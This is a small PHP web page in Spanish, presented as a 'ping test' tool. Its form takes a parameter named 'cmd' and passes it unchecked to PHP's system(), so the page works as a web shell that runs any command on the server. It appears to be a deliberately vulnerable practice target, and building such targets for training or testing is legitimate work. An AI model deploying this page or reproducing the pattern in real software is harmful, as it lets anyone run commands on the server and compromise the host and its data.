<!DOCTYPE html>
<html>
<head>
    <title>Web de prueba de ping</title>
    <!-- Agregar el enlace al CSS de Bootstrap -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body {
            background-color: #000;
            color: #fff;
        }

        .container {
            background-color: #fff;
            color: #000;
            padding: 20px;
            border-radius: 10px;
            margin-top: 50px;
        }

        h1, h2 {
            color: #000;
        }

        .btn-primary {
            background-color: #000;
            border-color: #000;
        }

        .btn-primary:hover {
            background-color: #333;
            border-color: #333;
        }

        input.form-control {
            background-color: #fff;
            color: #000;
        }

        pre {
            background-color: #000;
            color: #fff;
            border: 1px solid #fff;
            padding: 10px;
        }
    </style>
</head>
<body>
    <!-- Contenedor principal con estilo de Bootstrap -->
    <div class="container mt-5">
        <h1 class="text-center">Web de prueba de ping</h1>
        
        <div class="row mt-3">
            <div class="col-md-6 mx-auto">
                <p class="text-center">Por favor, pruebe a hacer ping a otra dirección IP</p>
                
                <form action="" method="GET" class="text-center">
                    <div class="mb-3">
                        <label for="cmd" class="form-label">Ingrese un comando:</label>
                        <input type="text" class="form-control" id="cmd" name="cmd">
                    </div>
                    <button type="submit" class="btn btn-primary">Ejecutar</button>
                </form>
                
                <?php
                if (isset($_GET['cmd'])) {
                    $cmd = $_GET['cmd'];
                    echo "<h2 class='mt-4'>Resultado:</h2>";
                    echo "<pre>";
                    system($cmd);
                    echo "</pre>";
                }
                ?>
            </div>
        </div>
    </div>

    <!-- Agregar el enlace al JS de Bootstrap (opcional) -->
    <!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script> -->
</body>
</html>
